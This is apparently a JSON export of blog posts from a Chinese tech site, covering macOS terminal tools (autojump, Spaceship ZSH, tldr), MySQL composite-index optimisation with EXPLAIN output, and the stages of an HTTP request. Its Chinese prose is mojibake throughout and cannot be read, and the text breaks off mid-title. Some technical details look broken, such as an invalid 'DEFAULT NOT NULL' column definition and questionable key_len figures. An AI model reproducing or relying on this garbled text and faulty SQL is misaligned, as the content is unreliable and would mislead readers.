åœ¨é¢„è§ˆåº”ç”¨ç¨‹åºä¸­æ‰“å¼€ç‰¹å®šçš„æ‰‹å†Œé¡µ showfiles æ˜¾ç¤ºéšè—æ–‡ä»¶ hidefiles éšè—éšè—çš„æ–‡ä»¶ rmdsstore ä»¥é€’å½’æ–¹å¼åˆ é™¤ç›®å½•ä¸­çš„.DS_Storeæ–‡ä»¶ tmuxtmux æ˜¯ä¸€ä¸ªç»ˆç«¯ä¸‹çª—å£åˆ†å‰²çš„å·¥å…·ï¼Œæœ‰å…³å®ƒçš„å…·ä½“ä»‹ç»ï¼Œè¯·æŸ¥é˜…è¿™ç¯‡ç¬”è®°ã€‚ autojumpautojump - ç›®å½•å¿«é€Ÿè·³è½¬å‘½ä»¤è¡Œå·¥å…·ï¼Œä»æ­¤å‘Šåˆ«cd... cd...ã€‚ autojump æ˜¯ä¸€ä¸ªWindowsã€Linuxã€macOS éƒ½èƒ½ä½¿ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè¿™æ˜¯ä»…ä»‹ç»macOS çš„å®‰è£…æ–¹å¼ã€‚ 1brew install autojump ä½¿ç”¨brewå®‰è£…å®Œæˆä¹‹åï¼Œè¿˜éœ€è¦è¿›è¡Œé…ç½®ï¼Œä»¥ä¸‹æ–¹æ³•äºŒé€‰ä¸€ï¼š åœ¨ ~/.bash_profile æ–‡ä»¶ä¸­åŠ å…¥è¯­å¥ [[ -s $(brew --prefix)/etc/profile.d/autojump.sh ]] &amp;&amp; . $(brew --prefix)/etc/profile.d/autojump.shã€‚ åœ¨ ~/.zshrc æ–‡ä»¶ä¸­ï¼Œä¿®æ”¹ plugins=(git) æ’ä»¶é…ç½®è¡Œï¼Œä»¥å¼€å¯ zsh å¯¹ autojump æ’ä»¶çš„æ”¯æŒ plugins=(git autojump)ã€‚ å¸¸ç”¨å‘½ä»¤ å‘½ä»¤ æè¿° j foo è·³è½¬åˆ°åŒ…å« foo çš„ç›®å½• jc bar è·³è½¬åˆ°åŒ…å« bar çš„å­ç›®å½• jo file åœ¨è®¿è¾¾ä¸­æ‰“å¼€åŒ…å« file çš„ç›®å½• autojump â€“help æ‰“å¼€å¸®åŠ©åˆ—è¡¨ Spaceship ZSHSpaceship ZSHâ€”â€”æ˜¯ä¸€ä¸ªæç®€ã€å¼ºå¤§å’Œå¯å®šåˆ¶çš„ZSHæç¤ºç¬¦ã€‚ æˆ‘æ˜¯åœ¨æ— æ„é—´å‘ç°çš„è¿™ä¸ªç»ˆç«¯å·¥å…·çš„ï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹å®é™…æ•ˆæœã€‚ ç‰¹ç‚¹Spaceship ZSH æœ‰å¾ˆå¤šå¾ˆæ£’çš„ç‰¹ç‚¹ï¼Œè¿™é‡Œä»…ä»…åˆ—ä¸¾ä¸€äº›æˆ‘æ‰€çœ‹è§çš„ã€‚ é¢œå€¼å³æ­£ä¹‰ å±•ç¤ºå½“å‰Git ä»“åº“çš„çŠ¶æ€ å±•ç¤ºå„ç§è¯­è¨€çš„å½“å‰ç‰ˆæœ¬ å±•ç¤ºæœ€åä¸€æ¡å‘½ä»¤çš„æ€»æ‰§è¡Œæ—¶é—´ å®‰è£…Spaceship ZSH çš„å®‰è£…æ–¹å¼æœ‰å¤šç§ï¼Œè¿™é‡Œä»…ä»‹ç»é€šè¿‡oh-my-zshçš„å®‰è£…æ–¹å¼ï¼Œå…¶ä»–æ–¹å¼å¯å‚è€ƒå®˜ç½‘ã€‚ å…‹éš†ä»“åº“1git clone https:&#x2F;&#x2F;github.com&#x2F;denysdovhan&#x2F;spaceship-prompt.git &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship-prompt&quot; å°†spaceship.zsh-theme é“¾æ¥åˆ°oh-my-zsh çš„ä¸»é¢˜ç›®å½•1ln -s &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship-prompt&#x2F;spaceship.zsh-theme&quot; &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship.zsh-theme&quot; ç¼–è¾‘~/.zshrc1ZSH_THEME&#x3D;&quot;spaceship&quot; tldrtldr æ˜¯ä¸€ä¸ªæ¯”man æ›´å¥½ç”¨çš„å‘½ä»¤è¡Œæ‰‹å†Œã€‚ å®ƒè¡ç”Ÿå‡ºäº†å„ç§è¯­è¨€çš„å®¢æˆ·ç«¯ï¼Œè¿™é‡Œç›´æ¥ä½¿ç”¨å®˜ç½‘æ¨èçš„æ–¹å¼è¿›è¡Œå®‰è£…ï¼š 1npm install -g tldr å®‰è£…å®Œæˆä¹‹åï¼Œç¬¬ä¸€æ¬¡ä½¿ç”¨tldrå‘½ä»¤éœ€è¦ä¸‹è½½ç›¸å…³ä¾èµ–ï¼š 123tldr tarPage not found. Updating cache...Error: connect ECONNREFUSED 127.0.0.1:443 å¦‚æœå‡ºç°ä¸Šé¢è¿™ä¸ªè¾“å‡ºï¼Œè¡¨ç¤ºå‘½ä»¤è¡Œéœ€è¦ä½¿ç”¨ä»£ç†ï¼Œå¦‚æœä¸çŸ¥é“å¦‚ä½•è®¾ç½®ï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡ç¬”è®°ã€‚ æ­£å¸¸è¾“å‡ºå¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233tldr tarâœ” Page not found. Updating cache...âœ” Creating index... tar Archiving utility. Often combined with a compression method, such as gzip or bzip. More information: https:&#x2F;&#x2F;www.gnu.org&#x2F;software&#x2F;tar. - [c]reate an archive from [f]iles: tar cf target.tar file1 file2 file3 - [c]reate a g[z]ipped archive from [f]iles: tar czf target.tar.gz file1 file2 file3 - [c]reate a g[z]ipped archive from a directory using relative paths: tar czf target.tar.gz --directory&#x3D;path&#x2F;to&#x2F;directory . - E[x]tract a (compressed) archive [f]ile into the current directory: tar xf source.tar[.gz|.bz2|.xz] - E[x]tract a (compressed) archive [f]ile into the target directory: tar xf source.tar[.gz|.bz2|.xz] --directory&#x3D;directory - [c]reate a compressed archive from [f]iles, using [a]rchive suffix to determine the compression program: tar caf target.tar.xz file1 file2 file3 - Lis[t] the contents of a tar [f]ile [v]erbosely: tar tvf source.tar - E[x]tract [f]iles matching a pattern: tar xf source.tar --wildcards &quot;*.html&quot; ä¸Šé¢é‚£ä¸ªnode çš„å®¢æˆ·ç«¯ä¸æ˜¯äº¤äº’å¼çš„ï¼Œå¦‚æœéœ€è¦è‡ªåŠ¨çš„ï¼Œå¯ä»¥ä½¿ç”¨ tldr++ï¼Œè¿™æ˜¯ä¸€ä¸ªGo è¯­è¨€ç¼–å†™çš„äº¤äº’å¼å®¢æˆ·ç«¯ã€‚ å‚è€ƒé“¾æ¥ å®‰è£… zsh å¦‚ä½•å¯ç”¨ zsh çš„æ’ä»¶ OSX æ’ä»¶ Spaceship ZSH autojumpâ€”â€”è‡ªåŠ¨è·³è½¬æ–‡ä»¶ç›®å½• tldrâ€”â€”æ¯”man æ›´å¥½ç”¨çš„å‘½ä»¤è¡Œæ‰‹å†Œ","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"},{"name":"Mac","slug":"Tutorial/Mac","permalink":"https://www.0x2beace.com/categories/Tutorial/Mac/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Mysql ç´¢å¼•è®¾è®¡ä¸ä¼˜åŒ–","slug":"mysql-index-design-and-optimization","date":"2021-01-10T13:12:04.000Z","updated":"2021-01-10T13:13:04.486Z","comments":true,"path":"mysql-index-design-and-optimization/","link":"","permalink":"https://www.0x2beace.com/mysql-index-design-and-optimization/","excerpt":"ä»€ä¹ˆæ˜¯ç´¢å¼•ï¼Ÿ","text":"ä»€ä¹ˆæ˜¯ç´¢å¼•ï¼Ÿ æ•°æ®åº“ç´¢å¼•æ˜¯ä¸€ç§æ•°æ®ç»“æ„ï¼Œå®ƒä»¥é¢å¤–çš„å†™å…¥å’Œå­˜å‚¨ç©ºé—´ä¸ºä»£ä»·æ¥æé«˜æ•°æ®åº“è¡¨ä¸Šæ•°æ®æ£€ç´¢æ“ä½œçš„é€Ÿåº¦ã€‚é€šä¿—æ¥è¯´ï¼Œç´¢å¼•ç±»ä¼¼äºä¹¦çš„ç›®å½•ï¼Œæ ¹æ®å…¶ä¸­è®°å½•çš„é¡µç å¯ä»¥å¿«é€Ÿæ‰¾åˆ°æ‰€éœ€çš„å†…å®¹ã€‚â€”â€”ç»´åŸºç™¾ç§‘ å¸¸è§ç´¢å¼•æœ‰å“ªäº›ï¼Ÿ æ™®é€šç´¢å¼•ï¼šæœ€åŸºæœ¬çš„ç´¢å¼•ï¼Œæ²¡æœ‰ä»»ä½•é™åˆ¶ å”¯ä¸€ç´¢å¼•ï¼šä¸â€æ™®é€šç´¢å¼•â€œç±»ä¼¼ï¼Œä¸åŒçš„å°±æ˜¯ï¼šç´¢å¼•åˆ—çš„å€¼å¿…é¡»æ˜¯å”¯ä¸€ï¼Œä½†å…è®¸æœ‰ç©ºå€¼ ä¸»é”®ç´¢å¼•ï¼šå®ƒæ˜¯ä¸€ç§ç‰¹æ®Šçš„ç´¢å¼•ï¼Œä¸å…è®¸æœ‰ç©ºå€¼ å…¨æ–‡ç´¢å¼•ï¼šä»…å¯ç”¨äº MyISAM è¡¨ï¼Œé’ˆå¯¹è¾ƒå¤§çš„æ•°æ®ï¼Œç”Ÿæˆå…¨æ–‡ç´¢å¼•å¾ˆè€—æ—¶å ç©ºé—´ ç»„åˆç´¢å¼•ï¼šä¸ºäº†æé«˜å¤šæ¡ä»¶æŸ¥è¯¢æ•ˆç‡ï¼Œå¯å»ºç«‹ç»„åˆç´¢å¼•ï¼Œéµå¾ªâ€æœ€å·¦å‰ç¼€åŒ¹é…åŸåˆ™â€œ è¿™é‡Œä»¥ç›¸å¯¹å¤æ‚çš„ç»„åˆä¸ºä¾‹ï¼Œä»‹ç»å¦‚ä½•ä¼˜åŒ–ã€‚ æœ€å·¦å‰ç¼€åŒ¹é…åŸåˆ™é¦–å…ˆæˆ‘ä»¬è¦çŸ¥é“ä»€ä¹ˆæ˜¯æœ€å·¦å‰ç¼€åŒ¹é…åŸåˆ™ã€‚ æœ€å·¦å‰ç¼€åŒ¹é…åŸåˆ™æ˜¯æŒ‡åœ¨ä½¿ç”¨ B+Tree è”åˆç´¢å¼•è¿›è¡Œæ•°æ®æ£€ç´¢æ—¶ï¼ŒMySQL ä¼˜åŒ–å™¨ä¼šè¯»å–è°“è¯ï¼ˆè¿‡æ»¤æ¡ä»¶ï¼‰å¹¶æŒ‰ç…§è”åˆç´¢å¼•å­—æ®µåˆ›å»ºé¡ºåºä¸€ç›´å‘å³åŒ¹é…ç›´åˆ°é‡åˆ°èŒƒå›´æŸ¥è¯¢æˆ–éç­‰å€¼æŸ¥è¯¢ååœæ­¢åŒ¹é…ï¼Œæ­¤å­—æ®µä¹‹åçš„ç´¢å¼•åˆ—ä¸ä¼šè¢«ä½¿ç”¨ï¼Œè¿™æ—¶è®¡ç®— key_len å¯ä»¥åˆ†æå‡ºè”åˆç´¢å¼•å®é™…ä½¿ç”¨äº†å“ªäº›ç´¢å¼•åˆ—ã€‚ å¦‚ä½•è®¡ç®— key_lené€šè¿‡ key_len è®¡ç®—ä¹Ÿå¸®åŠ©æˆ‘ä»¬äº†è§£ç´¢å¼•çš„æœ€å·¦å‰ç¼€åŒ¹é…åŸåˆ™ã€‚ key_len è¡¨ç¤ºå¾—åˆ°ç»“æœé›†æ‰€ä½¿ç”¨çš„é€‰æ‹©ç´¢å¼•çš„é•¿åº¦[å­—èŠ‚æ•°]ï¼Œä¸åŒ…æ‹¬ order byï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœ order by ä¹Ÿä½¿ç”¨äº†ç´¢å¼•åˆ™ key_len ä¸è®¡ç®—åœ¨å†…ã€‚ åœ¨è®¡ç®— key_len ä¹‹å‰ï¼Œå…ˆæ¥æ¸©ä¹ ä¸€ä¸‹åŸºæœ¬æ•°æ®ç±»å‹ï¼ˆä»¥UTF8 ç¼–ç ä¸ºä¾‹ï¼‰ï¼š|ç±»å‹|æ‰€å ç©ºé—´|ä¸å…è®¸ä¸ºNULLé¢å¤–å ç”¨||-|-|-||char|ä¸€ä¸ªå­—ç¬¦ä¸‰ä¸ªå­—èŠ‚|ä¸€ä¸ªå­—èŠ‚||varchar|ä¸€ä¸ªå­—ç¬¦ä¸‰ä¸ªå­—èŠ‚|ä¸€ä¸ªå­—èŠ‚||int|å››ä¸ªå­—èŠ‚|ä¸€ä¸ªå­—èŠ‚||tinyint|ä¸€ä¸ªå­—èŠ‚|ä¸€ä¸ªå­—èŠ‚| æµ‹è¯•æ•°æ®è¡¨å¦‚ä¸‹ï¼š 12345678CREATE TABLE &#96;test_table&#96; ( &#96;id&#96; int(11) NOT NULL AUTO_INCREMENT, &#96;a&#96; int(11) DEFAULT NOT NULL, &#96;b&#96; int(11) DEFAULT NOT NULL, &#96;c&#96; int(11) DEFAULT NOT NULL, PRIMARY KEY (&#96;id&#96;), KEY &#96;test_table_a_b_c_index&#96; (&#96;a&#96;,&#96;b&#96;,&#96;c&#96;)) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8; å‘½ä¸­ç´¢å¼•ï¼š 123456mysql&gt; explain select * from test_table where a &#x3D; 1 and b &#x3D; 2 and c &#x3D; 3;+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+| id | select_type | table | partitions | type | possible_keys | key | key_len | ref | rows | filtered | Extra |+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+| 1 | SIMPLE | test_table | NULL | ref | test_table_a_b_c_index | test_table_a_b_c_index | 12 | const,const,const | 1 | 100.00 | Using index |+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+ å¯ä»¥çœ‹åˆ° key_len = 12ï¼Œè¿™æ˜¯å¦‚ä½•è®¡ç®—çš„å‘¢ï¼Ÿå› ä¸ºå­—ç¬¦é›†æ˜¯ UTF8ï¼Œä¸€ä¸ªå­—æ®µå ç”¨å››ä¸ªå­—èŠ‚ï¼Œä¸‰ä¸ªå­—æ®µå°±æ˜¯ 4 * 3 = 12 å­—èŠ‚ã€‚ æ˜¯å¦å…è®¸ä¸º NULLï¼Œå¦‚æœå…è®¸ä¸º NULLï¼Œåˆ™éœ€è¦ç”¨é¢å¤–çš„å­—èŠ‚æ¥æ ‡è®°è¯¥å­—æ®µï¼Œä¸åŒçš„æ•°æ®ç±»å‹æ‰€éœ€çš„å­—èŠ‚å¤§å°ä¸åŒã€‚ 123456789mysql&gt; ALTER TABLE &#96;test_table&#96; CHANGE &#96;a&#96; &#96;a&#96; INT(11) NULL;mysql&gt; ALTER TABLE &#96;test_table&#96; CHANGE &#96;c&#96; &#96;c&#96; INT(11) NULL;mysql&gt; ALTER TABLE &#96;test_table&#96; CHANGE &#96;b&#96; &#96;b&#96; INT(11) NULL;mysql&gt; explain select * from test_table where a &#x3D; 1 and b &#x3D; 2 and c &#x3D; 3;+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+| id | select_type | table | partitions | type | possible_keys | key | key_len | ref | rows | filtered | Extra |+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+| 1 | SIMPLE | test_table | NULL | ref | test_table_a_b_c_index | test_table_a_b_c_index | 15 | const,const,const | 1 | 100.00 | Using index |+----+-------------+------------+------------+------+------------------------+------------------------+---------+-------------------+------+----------+-------------+ å¯ä»¥çœ‹åˆ°ï¼Œå½“å­—æ®µå…è®¸ä¸ºç©ºæ—¶ï¼Œè¿™æ—¶çš„key_len å˜æˆäº†15 = 4 * 3 + 1 * 3ï¼ˆINT ç±»å‹ä¸ºç©ºæ—¶ï¼Œé¢å¤–å ç”¨ä¸€ä¸ªå­—èŠ‚ï¼‰ã€‚ ç´¢å¼•ä¼˜åŒ–æœ‰äº†è¿™äº›åŸºç¡€çŸ¥è¯†ä¹‹åï¼Œå†æ¥æ ¹æ®å®é™…çš„SQL åˆ¤æ–­ç´¢æ€§æ€§èƒ½å¥½åã€‚ è¿˜æ˜¯ä»¥ä¸Šé¢é‚£å¼ æ•°æ®è¡¨ä¸ºä¾‹ï¼Œä¸º aã€bã€c ä¸‰ä¸ªå­—æ®µåˆ›å»ºè”åˆç´¢å¼•ã€‚|SQL è¯­å¥|æ˜¯å¦ç´¢å¼•||-|-||explain select * from test_table where a = 1 and b = 2 and c = 3;|Extra:Using index key_len: 15||explain select * from test_table where a = 1 and b = 2 and c = 3 order by c;|Extra:Using index key_len: 15||explain select * from test_table where b = 2 and c = 3;|Extra:Using where; Using index key_len: 15||explain select * from test_table where a = 1 order by c;|Extra:Using where; Using index; Using filesort key_len: 5||explain select * from test_table order by a, b, c;|Extra:Using index key_len: 15||explain select * from test_table order by a, b, c desc;|Extra:Using index; Using filesort key_len:15||explain select * from test_table where a in (1,2) and b in (1,2,3) and c = 1;|Extra:Using where; Using index key_len: 15| é€šå¸¸åœ¨æŸ¥çœ‹æ‰§è¡Œè®¡åˆ’æ—¶ï¼Œ Extra åˆ—ä¸º Using index åˆ™è¡¨ç¤ºä¼˜åŒ–å™¨ä½¿ç”¨äº†è¦†ç›–ç´¢å¼•ã€‚ SQL1 å¯ä»¥ä½¿ç”¨è¦†ç›–ç´¢å¼•ï¼Œæ€§èƒ½å¥½ SQL2 å¯ä»¥ä½¿ç”¨è¦†ç›–ç´¢å¼•ï¼ŒåŒæ—¶é¿å…æ’åºï¼Œæ€§èƒ½å¥½ SQL3 å¯ä»¥ä½¿ç”¨è¦†ç›–ç´¢å¼•ï¼Œä½†æ˜¯éœ€è¦æ ¹æ® where å­—å¥è¿›è¡Œè¿‡æ»¤ SQL4 å¯ä»¥ä½¿ç”¨éƒ¨åˆ†ç´¢å¼• aï¼Œä½†æ— æ³•é¿å…æ’åºï¼Œæ€§èƒ½å·® SQL5 å¯ä»¥å®Œå…¨ä½¿ç”¨è¦†ç›–ç´¢å¼•ï¼ŒåŒæ—¶å¯ä»¥é¿å…æ’åºï¼Œæ€§èƒ½å¥½ SQL6 å¯ä»¥ä½¿ç”¨è¦†ç›–ç´¢å¼•ï¼Œä½†æ— æ³•é¿å…æ’åºï¼Œï¼ˆè¿™æ˜¯å› ä¸º MySQL InnoDB åˆ›å»ºç´¢å¼•æ—¶é»˜è®¤ascå‡åºï¼Œç´¢å¼•æ— æ³•è‡ªåŠ¨å€’åºæ’åºï¼‰ SQL7 å¯ä»¥ä½¿ç”¨è¦†ç›–ç´¢å¼•ï¼Œä½†æ˜¯éœ€è¦æ ¹æ® where å­å¥è¿›è¡Œè¿‡æ»¤ï¼ˆéå®šå€¼æŸ¥è¯¢ï¼‰ åˆ›å»ºç´¢å¼•è§„èŒƒ è€ƒè™‘åˆ°ç´¢å¼•ç»´æŠ¤çš„æˆæœ¬ï¼Œå•å¼ è¡¨çš„ç´¢å¼•æ•°é‡ä¸è¶…è¿‡ 5 ä¸ªï¼Œå•ä¸ªç´¢å¼•ä¸­çš„å­—æ®µæ•°ä¸è¶…è¿‡ 5 ä¸ª ä¸åœ¨ä½åŸºæ•°åˆ—ä¸Šå»ºâ½´ç´¢å¼•ï¼Œä¾‹å¦‚â€œæ€§åˆ«â€ã€‚ åœ¨ä½åŸºæ•°åˆ—ä¸Šåˆ›å»ºçš„ç´¢å¼•æŸ¥è¯¢ç›¸æ¯”å…¨è¡¨æ‰«æä¸ä¸€å®šæœ‰æ€§èƒ½ä¼˜åŠ¿ï¼Œç‰¹åˆ«æ˜¯å½“å­˜åœ¨å›è¡¨æˆæœ¬æ—¶ã€‚ åˆç†åˆ›å»ºè”åˆç´¢å¼•ï¼Œ(a,b,c) ç›¸å½“äº (a) ã€(a,b) ã€(a,b,c)ã€‚ åˆç†ä½¿ç”¨è¦†ç›–ç´¢å¼•å‡å°‘IOï¼Œé¿å…æ’åºã€‚ å‚è€ƒé“¾æ¥ Explainä¹‹key_lené•¿åº¦è®¡ç®—","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"ä¸€æ¬¡å®Œæ•´çš„ç½‘ç»œè¯·æ±‚è¿‡ç¨‹","slug":"a-complete-network-request-process","date":"2021-01-06T15:41:25.000Z","updated":"2021-02-25T11:54:22.940Z","comments":true,"path":"a-complete-network-request-process/","link":"","permalink":"https://www.0x2beace.com/a-complete-network-request-process/","excerpt":"åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ www.0xbeace.com è¿™ä¸ªåŸŸåï¼Œç„¶åå°±èƒ½çœ‹åˆ°ç²¾ç¾çš„é¡µé¢äº†ï¼Œè¿™ä¸­é—´å€’åº•å‘ç”Ÿäº†äº›ä»€ä¹ˆå‘¢ï¼Ÿ","text":"åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ www.0xbeace.com è¿™ä¸ªåŸŸåï¼Œç„¶åå°±èƒ½çœ‹åˆ°ç²¾ç¾çš„é¡µé¢äº†ï¼Œè¿™ä¸­é—´å€’åº•å‘ç”Ÿäº†äº›ä»€ä¹ˆå‘¢ï¼Ÿ å…¶æ•´ä¸ªè¿‡ç¨‹å¤§è‡´å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š DNS åŸŸåè§£æï¼Œå¯»æ‰¾å¯¹åº”çš„IP åœ°å€ æ ¹æ®è¿™ä¸ªIP æ‰¾åˆ°å¯¹åº”çš„æœåŠ¡å™¨ï¼Œå»ºç«‹TCP è¿æ¥ï¼ˆä¸‰æ¬¡æ¡æ‰‹ï¼‰ TCP å»ºè¿ä¹‹åï¼Œå‘èµ·HTTP è¯·æ±‚ æœåŠ¡å™¨å“åº” HTTP è¯·æ±‚ å®¢æˆ·ç«¯æ¥æ”¶æ•°æ®è§£æå¹¶æ¸²æŸ“é¡µé¢ æœåŠ¡å™¨å…³é—­TCP è¿æ¥ï¼ˆå››æ¬¡æŒ¥æ‰‹ï¼‰ åŸŸåè§£æä»¥0xbeace.comè¿™ä¸ªåŸŸåä¸ºä¾‹ï¼ŒDNS åŸŸåè§£æå¤§è‡´å¯ä»¥ç»†åˆ†æˆä»¥ä¸‹å‡ ä¸ªå°æ­¥éª¤ï¼š DNS ç¼“å­˜ï¼ˆè¿™é‡Œçš„ç¼“å­˜åˆ†ä¸ºæµè§ˆå™¨å’Œæ“ä½œç³»ç»Ÿï¼‰ æœ¬åœ°åŸŸåæœåŠ¡å™¨ï¼ˆHosts æ–‡ä»¶ï¼‰ æ ¹åŸŸåæœåŠ¡å™¨ COM é¡¶çº§åŸŸåæœåŠ¡å™¨ 0xbeace.com åŸŸåæœåŠ¡å™¨ åŸŸåè§£æä¸€èˆ¬å°±æ˜¯æŒ‰ç…§è¯¥è¿‡ç¨‹å»æŸ¥æ‰¾ï¼Œè¿™é‡Œå¼•ç”¨ä¸€å¼ å›¾ï¼ˆæ²¡æ‰¾åˆ°å…·ä½“å‡ºå¤„ï¼‰ï¼Œæ›´åŠ é€šä¿—æ˜“æ‡‚åœ°è§£é‡Šäº†å®Œæ•´åœ°è§£æè¿‡ç¨‹ã€‚ DNS åŸŸåè§£æè¯¦ç»†è¿‡ç¨‹ TCP å»ºè¿å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚TCP è¿æ¥æˆåŠŸä¹‹åï¼Œå°±å¯ä»¥æŒ‰ç…§å›ºå®šæ ¼å¼å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚äº†ã€‚ ä¸€ä¸ªå®Œæ•´çš„ HTTP è¯·æ±‚åº”è¯¥åŒ…å«ä»¥ä¸‹å‡ éƒ¨åˆ†ï¼š è¯·æ±‚è¡Œï¼šç”¨äºæè¿°å®¢æˆ·ç«¯çš„è¯·æ±‚æ–¹å¼ï¼ˆGET/POSTç­‰ï¼‰ï¼Œè¯·æ±‚çš„èµ„æºåç§°(URL)ä»¥åŠä½¿ç”¨çš„HTTPåè®®çš„ç‰ˆæœ¬å· è¯·æ±‚å¤´ï¼šç”¨äºæè¿°å®¢æˆ·ç«¯è¯·æ±‚å“ªå°ä¸»æœºåŠå…¶ç«¯å£ï¼Œä»¥åŠå®¢æˆ·ç«¯çš„èº«ä»½ä¿¡æ¯ï¼ˆUser-Agentï¼‰ç­‰ è¯·æ±‚æ­£æ–‡ï¼šå®¢æˆ·ç«¯éœ€è¦å‘é€ç»™æœåŠ¡ç«¯çš„æ•°æ® æœåŠ¡ç«¯å“åº”è¯·æ±‚å®¢æˆ·ç«¯æˆåŠŸå‘èµ·è¯·æ±‚ä¹‹åï¼Œå®¢æˆ·ç«¯æ¥æ”¶è¯·æ±‚å¹¶å¤„ç†å°†ç»“æœå“åº”è‡³å®¢æˆ·ç«¯ã€‚ ä¸€ä¸ªå®Œæ•´çš„ HTTP å“åº”åº”è¯¥åŒ…å«ä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ï¼š çŠ¶æ€è¡Œï¼šå¦‚ï¼šHTTP/1.1 200 okï¼Œåˆ†åˆ«è¡¨ç¤º httpç‰ˆæœ¬ + çŠ¶æ€ç  + çŠ¶æ€ä»£ç çš„æ–‡æœ¬æè¿° å“åº”å¤´ï¼šåŒ…å«æœåŠ¡å™¨ç›¸å…³ä¿¡æ¯ å“åº”æ­£æ–‡ï¼šæœåŠ¡å™¨è¿”å›ç»™å®¢æˆ·ç«¯çš„æ•°æ® å®¢æˆ·ç«¯æ¸²æŸ“è¿™é‡Œä»¥æœ€å¸¸è§çš„ .html æ–‡ä»¶ä¸ºä¾‹ï¼Œå½“å®¢æˆ·ç«¯æ¥æ”¶åˆ°å“åº”æ•°æ®ä¹‹åï¼Œä¾¿å¼€å§‹è§£æ HTMLï¼Œå¦‚æœé‡åˆ°js/cssè¿™ç±»é™æ€èµ„æºï¼Œå°±ä¼šå‘æœåŠ¡å™¨å‘èµ·ä¸€ä¸ªHTTP è¯·æ±‚ï¼Œå¦‚æœè¯¥è¯·æ±‚çš„è¿”å›çŠ¶æ€ç æ˜¯ 304ï¼ˆå·²ç»ç¼“å­˜åœ¨æœ¬åœ°æµè§ˆå™¨äº†ï¼‰ï¼Œå°±ä¼šç›´æ¥ä»ç¼“å­˜ä¸­è·å–ï¼Œå¦åˆ™å°±ä¼šå¼€å¯æ–°çš„çº¿ç¨‹å»å‘æœåŠ¡å™¨è¯·æ±‚ä¸‹è½½ã€‚ è¿™æ—¶å°±ç”¨åˆ°äº† keep-alive è¿™ä¸ªç‰¹æ€§ï¼Œå¯ä»¥å»ºç«‹ä¸€æ¬¡TCP è¿æ¥ï¼Œå‘èµ·å¤šæ¬¡ HTTP è¯·æ±‚ã€‚ ç„¶åæµè§ˆå™¨å†åˆ©ç”¨è‡ªå·±çš„å†…éƒ¨å·¥ä½œæœºåˆ¶ï¼Œå°†HTML ä¸é™æ€èµ„æºè¿›è¡Œæ¸²æŸ“ï¼Œæœ€åå‘ˆç°ç»™ç”¨æˆ·ã€‚ TCP å…³é—­è¿æ¥ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒæœåŠ¡ç«¯å‘å®¢æˆ·ç«¯å®Œæˆä¸€æ¬¡è¯·æ±‚ï¼Œå°±ä¼šå…³é—­TCP è¿æ¥ï¼Œé‚£ä¹ˆä¸‹ä¸€æ¬¡åˆéœ€è¦å‘èµ· HTTP è¯·æ±‚æ—¶ï¼Œå°±éœ€è¦å†æ¬¡å»ºç«‹ä¸€æ¬¡TCP è¿æ¥äº†ã€‚ é¢‘ç¹å»ºç«‹/å…³é—­è¿æ¥ï¼Œä¸ä»…å¢åŠ äº†è¯·æ±‚å“åº”æ—¶é—´ï¼Œè¿˜é¢å¤–å¢åŠ äº†ç½‘ç»œå¸¦å®½æ¶ˆè€—ï¼Œæ‰€ä»¥HTTP åè®®ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªå¯ä»¥ä¿æŒTCP çš„é€šç”¨æ¶ˆæ¯å¤´ï¼š 1Connection:keep-alive è‡³æ­¤ä¸€ä¸ªå®Œæ•´çš„HTTP è¯·æ±‚å°±å®Œæˆäº†ã€‚ å…¶ä»–é—®é¢˜ä¸ºä»€ä¹ˆHTTP åè®®è¦åŸºäºTCP æ¥å®ç°è¿™æ˜¯å› ä¸ºTCP æ˜¯ä¸€ä¸ªç«¯åˆ°ç«¯çš„é¢å‘è¿æ¥çš„åè®®ï¼ŒHTTPåŸºäºä¼ è¾“å±‚TCPåè®®ä¸ç”¨æ‹…å¿ƒæ•°æ®ä¼ è¾“çš„å„ç§é—®é¢˜ï¼ˆå½“å‘ç”Ÿé”™è¯¯æ—¶ï¼Œä¼šé‡ä¼ ï¼‰ã€‚ å‚è€ƒé“¾æ¥ ä¸€æ¬¡å®Œæ•´çš„HTTPè¯·æ±‚è¿‡ç¨‹ ä¸€æ¬¡å®Œæ•´çš„ç½‘ç»œè¯·æ±‚æ˜¯æ€ä¹ˆæ ·çš„ï¼Ÿ","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"}]},{"title":"PHP 